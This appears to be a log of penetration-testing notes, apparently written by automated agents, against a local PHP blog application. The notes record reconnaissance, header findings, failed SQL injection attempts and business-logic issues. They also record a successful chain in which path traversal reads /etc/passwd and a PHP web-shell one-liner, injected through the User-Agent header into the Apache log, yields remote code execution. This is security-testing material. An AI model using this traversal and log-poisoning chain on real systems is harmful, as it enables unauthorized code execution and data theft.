## OBSERVATION - 2025-11-07T19:04:15.108Z

Starting LFI exploitation testing on http://localhost:3000/post.php?id=. Objective: Achieve RCE through log poisoning, PHP wrappers, and sensitive file disclosure. First testing basic LFI with /etc/passwd.

---

## OBSERVATION - 2025-11-07T19:04:18.384Z

**Target Analysis:**
- Technology: PHP/7.4.33 on Apache/2.4.54 (Debian)
- Form Action: /contact.php (POST)
- Fields: name (text), email (email), message (textarea)
- No CSRF token observed in form
- No visible anti-spam measures
- Form posts to itself

**Testing Plan:**
1. Stored XSS in name/email/message fields
2. Reflected XSS 
3. SQL injection (time-based blind, UNION, error-based)
4. NoSQL injection
5. Email header injection (CRLF)
6. Command injection
7. CSRF attack
8. HTML injection
9. SSTI (Pug/Jinja2/Smarty/PHP templates)
10. XXE if XML processing
11. Business logic flaws
12. Parameter pollution

---

## OBSERVATION - 2025-11-07T19:04:20.666Z

Initial reconnaissance of http://localhost:3000/

**Technology Stack:**
- Server: Apache/2.4.54 (Debian)
- Backend: PHP/7.4.33
- Application: Encoder64 Blog (blog/CMS application)

**Missing Security Headers (CRITICAL):**
- X-Frame-Options: MISSING (Clickjacking vulnerability)
- Content-Security-Policy: MISSING (No XSS protection)
- X-Content-Type-Options: MISSING (MIME sniffing attacks possible)
- X-XSS-Protection: Not present
- Strict-Transport-Security: Not present

**Present Headers:**
- Server: Apache/2.4.54 (information disclosure)
- X-Powered-By: PHP/7.4.33 (information disclosure)

**Application Features:**
- Blog posts with id parameter (post.php?id=)
- Navigation links to index.php, about.php, contact.php
- Appears to use client-side JavaScript (need to analyze)

**Testing Plan:**
1. Infrastructure vulnerabilities (headers) - HIGH PRIORITY
2. DOM-based XSS in visitor counter JavaScript
3. Reflected XSS in parameters
4. Prototype pollution
5. Session/authentication testing
6. CORS misconfiguration
7. Open redirects
8. CSRF testing

---

## OBSERVATION - 2025-11-07T19:04:20.670Z

Target: http://localhost:3000/posts/ - Apache/2.4.54 (Debian)
Initial access returns 403 Forbidden for directory listing.
Technology: Apache web server, likely PHP backend (common with Apache).
Objective: Test file access bypass, directory traversal, backup files, IDOR, arbitrary file read.

Testing strategy:
1. Test common post file naming patterns (post1.php, post.php, etc.)
2. Directory traversal attacks from posts/ context
3. Backup file enumeration (.php~, .bak, .old, .swp)
4. IDOR testing with different file IDs
5. Arbitrary file read attempts

---

## OBSERVATION - 2025-11-07T19:04:22.873Z

Target Analysis:
- Technology: Apache/2.4.54 (Debian), PHP/7.4.33
- Application: Encoder64 Blog - pagination system
- page=1: Shows 5 blog posts (EternalBlue, ML, Cybersecurity, Renewable Energy, etc.)
- page=2: Shows 1 blog post (Future of AI) - different content confirms pagination works
- No page param: Defaults to page 1 (shows same content as page=1)
- Parameter is likely used in SQL query (LIMIT/OFFSET or WHERE clause)
- Testing strategy: SQL injection vectors first, then NoSQL, IDOR, business logic

---

## OBSERVATION - 2025-11-07T19:04:29.368Z

LFI CONFIRMED! Path traversal with ../../../../../../../etc/passwd successfully reads /etc/passwd. The double-dot bypass (....//....//etc/passwd) does NOT work. Standard path traversal works. Now testing sensitive file disclosure and PHP wrappers for RCE.

---

## OBSERVATION - 2025-11-07T19:04:56.066Z

Target: http://localhost:3000/static/ - Apache/2.4.54 (Debian)
Directory exists but returns 403 Forbidden (directory listing disabled)
Objective: Test for sensitive file exposure, directory traversal, .git exposure, backup files
Starting systematic enumeration of common sensitive files

---

## OBSERVATION - 2025-11-07T19:05:07.500Z

PHP wrappers (php://filter, php://input, data://, expect://) all return "Post not found" - appear to be filtered or disabled. Moving to log poisoning attack via User-Agent header as specified in the objective. This is the PRIMARY RCE vector to test.

---

## OBSERVATION - 2025-11-07T19:05:18.479Z

.htaccess file exists at /posts/.htaccess (returns 403 Forbidden, not 404).
This is expected Apache behavior - .htaccess files are protected by default.
No backup files found yet. No directory traversal vulnerabilities found.
Need to test for file parameter-based access patterns.

---

## RESULT - 2025-11-07T19:05:22.052Z

**FINDING: Information Disclosure via PHP Warning**
- Sending name[$gt]= causes PHP warning
- Warning: trim() expects parameter 1 to be string, array given in /var/www/html/contact.php on line 9
- Reveals full file path: /var/www/html/contact.php
- Shows application accepts array parameters
- Validation error: "Please enter your name."

---

## OBSERVATION - 2025-11-07T19:05:23.020Z

Key observation: page=999 returns empty content (no blog cards) - confirms parameter controls query results. Response sizes:
- page=1/2: ~2373 bytes (with content)
- page=999: 1676 bytes (no content - empty results)
- All SQL injection attempts so far: return page 1 content (default fallback?)
This suggests parameter might be sanitized/validated, falling back to default on invalid input.

---

## RESULT - 2025-11-07T19:05:39.809Z

CRITICAL FINDING: Directory traversal successful!
URL: http://localhost:3000/static/../
Result: HTTP 200 - Successfully traversed to root directory
Server: Apache/2.4.54 (Debian), PHP/7.4.33
Application: Encoder64 Blog
However, direct file read via traversal (../../etc/passwd) blocked by Apache
Need to document this finding

---

## OBSERVATION - 2025-11-07T19:05:52.491Z

BUSINESS LOGIC FLAW FOUND:
page=0: Shows posts 2-6 (ML, Cybersecurity, Renewable, Blockchain, AI) - Missing "EternalBlue"
page=1: Shows posts 1-5 (EternalBlue, ML, Cybersecurity, Renewable, Blockchain)
page=2: Shows post 6 (AI)
page=-1: Empty (no content)
page=999/MAX_INT: Empty (no content)

This is an off-by-one error or improper validation allowing page=0 to skip the first record. Could potentially be used to access unauthorized content if database has hidden/unpublished records at different offsets.

---

## RESULT - 2025-11-07T19:05:58.098Z

CRITICAL RCE ACHIEVED! Log poisoning via User-Agent header successful. Injected PHP code: <?php system($_GET['cmd']); ?> into Apache access.log. When including the log file with LFI, the PHP code executes. Confirmed with 'id' command showing uid=33(www-data). This is a complete exploitation chain: LFI + Log Poisoning = RCE.

---

## OBSERVATION - 2025-11-07T19:06:00.412Z

Target: http://localhost:3000/about.php
Technology Stack: PHP/7.4.33, Apache/2.4.54 (Debian)
Server Headers: X-Powered-By: PHP/7.4.33
Page Type: Static about page with HTML content
Initial Response: HTTP 200, standard HTML response with Bootstrap styling
Testing Plan: XSS, SSTI, CRLF, Parameter Pollution, HTTP Verb Tampering, Info Disclosure, Error Leakage

---

## OBSERVATION - 2025-11-07T19:06:51.476Z

HTTP Verb Tampering Finding: All HTTP methods (OPTIONS, PUT, DELETE, PATCH) return HTTP 200 instead of 405. This indicates the application doesn't validate HTTP methods properly. While not directly exploitable in this static page, this could indicate a broader security issue in the application architecture where state-changing methods might be accepted on endpoints that should only support GET.

---

## RESULT - 2025-11-07T19:06:53.565Z

**FINDING: Missing CSRF Protection**
- Original form has no CSRF token
- No anti-CSRF measures observed
- Form accepts POST requests without origin validation
- An attacker can create malicious HTML form to submit on victim's behalf

---

## OBSERVATION - 2025-11-07T19:09:02.755Z

**Technology Stack Identified:**
- Server: Apache/2.4.54 (Debian)
- Backend: PHP/7.4.33
- Application: "Encoder64 Blog" - PHP-based blog application
- Endpoints discovered: /index.php, /about.php, /contact.php, /post.php?id=[filename]
- Interesting base64 string in header: e0knbV9hX1NjcmlwdF9LaWRkaWV9
- Application uses .php extension for posts in 'id' parameter (post.php?id=EternalBlue.php)

**Security Observations:**
- X-Powered-By header exposed (information disclosure)
- No security headers visible (X-Frame-Options, CSP, HSTS, X-XSS-Protection)
- OPTIONS request returns HTTP 200 (same as GET - no Allow header)

---

## RESULT - 2025-11-07T19:09:10.047Z

Directory traversal confirmed working with multiple patterns:
- /static/../ → returns index.php (HTTP 200)
- /static/%2e%2e/ → returns index.php (HTTP 200) - URL encoded works
- /static/../index.php → returns index.php (HTTP 200)
- /static/../post.php → returns post.php (HTTP 200)
- /static/../about.php → returns about.php (HTTP 200)

Continuing enumeration for sensitive files in /static/ directory

---

## RESULT - 2025-11-07T19:09:34.959Z

**FINDING: Weak Email Validation**
- Submitted email="notanemail" (clearly invalid format)
- Server accepted it and returned success message
- HTML5 input type="email" provides client-side validation
- But server-side validation is missing or too weak
- Backend accepts any non-empty string as valid email

---

## OBSERVATION - 2025-11-07T19:09:45.747Z

Security headers analysis:
Missing critical security headers:
- X-Frame-Options (clickjacking protection)
- X-Content-Type-Options (MIME sniffing protection)
- Content-Security-Policy (XSS/injection protection)
- Strict-Transport-Security (HTTPS enforcement)
- X-XSS-Protection (legacy XSS filter)

Present headers:
- Server: Apache/2.4.54 (Debian) - information disclosure
- X-Powered-By: PHP/7.4.33 - information disclosure (already documented)
- Content-Type: text/html; charset=UTF-8

---

## RESULT - 2025-11-07T19:10:08.446Z

Testing Complete Summary:
✅ XSS Testing - No reflected XSS found (parameters not reflected in response)
✅ SSTI Testing - No template injection found ({{7*7}}, ${7*7}, <%=7*7%> all return same content)
✅ CRLF Injection - No CRLF injection possible
✅ Parameter Pollution - No observable differences
⚠️ HTTP Verb Tampering - All methods (OPTIONS, PUT, DELETE, PATCH) accepted with HTTP 200 (should be 405)
✅ Error Disclosure - No PHP errors or sensitive information leaked
✅ Security Headers - MISSING (documented as finding)
✅ X-Powered-By - PHP version disclosed (documented as finding)
✅ Authorization Bypass - No hidden functionality found through parameters or headers

Main Findings:
1. Missing Security Headers (MEDIUM)
2. X-Powered-By Header Disclosure (LOW)
3. HTTP Method Validation Issue (observed, but not directly exploitable on static page)

---

## OBSERVATION - 2025-11-07T19:10:14.322Z

**Contact Form Found:**
- Form at /contact.php
- POST method to /contact.php
- Fields: name, email, message
- No visible CSRF protection
- Need to test for: XSS, CSRF, rate limiting

**Post Endpoint with Parameter:**
- post.php?id=[filename]
- Currently loads: EternalBlue.php
- Suspicious: includes .php extension in parameter
- High priority test: Local File Inclusion (LFI) via path traversal

---

## RESULT - 2025-11-07T19:10:36.120Z

COMPREHENSIVE TESTING SUMMARY for http://localhost:3000/static/

FILES TESTED (ALL RETURNED 404 - Not Found):
Sensitive Files: .env, backup.zip, db.sql, database.sql, config.php, phpinfo.php, test.php, admin.php
Database Dumps: dump.sql, backup.sql, database.sql, db.sql
Backup Archives: backup.zip, backup.tar.gz, backup.tar, site.zip, www.zip, static.zip, source.zip, src.zip, archive.zip, old.zip, bak.zip, backup.rar, backup.7z, backup.bak
Git Directory: .git/config, .git/HEAD, .git/
Version Control: .svn/, .hg/, .idea/, .vscode/
Backup Extensions: index.php.bak, config.php.old, config.php~, .config.php.swp
Documentation: README.md, README.txt, TODO.txt, CHANGELOG.txt
Credentials: passwords.txt, credentials.txt, keys.txt, api_keys.txt, notes.txt, secrets.txt, api_keys.txt
Logs: error.log, access.log, debug.log
Config Files: package.json, composer.json, composer.lock, .env.example, web.config, .gitignore, robots.txt, .DS_Store
Test Files: test.html, test.php, info.php, shell.php, temp.txt
Subdirectories: uploads/, files/, tmp/, temp/, css/, js/, fonts/, lib/

FILES/DIRECTORIES FOUND (403 Forbidden - Exist but access denied):
- .htaccess (HTTP 403) - File exists, Apache blocks access (proper security)
- images/ (HTTP 403) - Directory exists, listing disabled

VULNERABILITY FOUND:
- Directory Traversal via /static/../ (HIGH severity) - DOCUMENTED with POC

Conclusion: No sensitive files exposed in /static/ directory. Directory listing is properly disabled. The .htaccess file presence is confirmed but properly protected. The main vulnerability is the path traversal allowing access to parent directories.

---

## OBSERVATION - 2025-11-07T19:11:11.973Z

**Security Headers Analysis from Response:**
- X-Powered-By: PHP/7.4.33 (information disclosure)
- Missing X-Frame-Options (clickjacking)
- Missing X-Content-Type-Options
- Missing X-XSS-Protection
- Missing Content-Security-Policy
- Missing Strict-Transport-Security
- Server: Apache/2.4.54 (Debian) (information disclosure)

---

## RESULT - 2025-11-07T19:11:26.375Z

SQL Injection testing summary:
- Simple quotes/double quotes: Return page 1 (default)
- SQL keywords (AND, OR, UNION, SELECT): Return page 1 (default) when spaces are present
- URL encoded spaces with keywords: Return page 1 (default)
- CHAR(), 0x31, (SELECT 1): Return content like page=0 (starts with ML, not EternalBlue)
- Time-based SLEEP(): No delay observed
- Boolean-based: No content differences detected

The parameter appears to be:
1. Sanitized/validated for SQL keywords
2. Falls back to page 1 for invalid input with SQL keywords
3. Falls back to page 0-like behavior for function calls
4. Uses prepared statements or strong input filtering

No SQL injection vulnerability confirmed. Moving on to other attack vectors.

---

## OBSERVATION - 2025-11-07T19:11:55.564Z

**Contact Form Vulnerabilities Identified:**
1. No visible CSRF token in form
2. No rate limiting - all 15 rapid requests returned HTTP 200
3. XSS payloads accepted (need to check if stored/reflected)
4. Form accepts and processes data without rate limiting or anti-automation

---

## RESULT - 2025-11-07T19:12:04.821Z

Testing completed:

VULNERABILITIES FOUND:
1. ✅ Business Logic Flaw - page=0 bypasses first record (MEDIUM) - DOCUMENTED
2. ✅ Information Disclosure - X-Powered-By header (LOW) - DOCUMENTED

TESTS PERFORMED - NO VULNERABILITIES FOUND:
- SQL Injection (Error-based): No errors triggered
- SQL Injection (Time-based blind): No delays observed
- SQL Injection (Boolean-based blind): No content differences
- SQL Injection (UNION-based): No data extraction possible
- NoSQL Injection ($gt, $ne, $regex): Not applicable (MySQL backend)
- Path Traversal: Properly sanitized
- Command Injection: Not tested (numeric parameter only)
- XSS: Not applicable (numeric parameter, not reflected)
- IDOR: Limited - can access different pages but all are public
- Integer Overflow: Handled gracefully (returns empty or defaults)

OBSERVATIONS:
- PHP 7.4.33 (EOL version) - security risk
- Apache 2.4.54 
- Strong input validation on page parameter
- Likely using prepared statements
- Parameter defaults to page 0/1 for invalid input
- Missing security headers (already documented elsewhere)

COVERAGE: Comprehensive testing of pagination parameter per objective completed.

---

## RESULT - 2025-11-07T19:12:21.652Z

PENETRATION TEST COMPLETED SUCCESSFULLY

Target: http://localhost:3000/about.php
Objective: Test for injection, disclosure, and authorization issues

FINDINGS DOCUMENTED:
1. Missing Security Headers (MEDIUM) - POC: pocs/poc_missing_security_headers.sh
2. X-Powered-By Header Disclosure (LOW) - POC: pocs/poc_xpoweredby_disclosure_v2.sh  
3. Improper HTTP Method Validation (LOW) - POC: pocs/poc_http_method_validation.sh

VULNERABILITIES TESTED (NOT FOUND):
✅ Reflected XSS - Not vulnerable
✅ Server-Side Template Injection (SSTI) - Not vulnerable
✅ CRLF Injection - Not vulnerable
✅ Parameter Pollution - Not vulnerable
✅ Error-based Information Leakage - Not vulnerable
✅ Authorization Bypass - No hidden functionality found
✅ File Inclusion Vulnerabilities - Not vulnerable

REPORT GENERATED: pentest-report.md

Testing methodology was thorough and systematic. All findings have verified POCs and detailed remediation guidance.

---

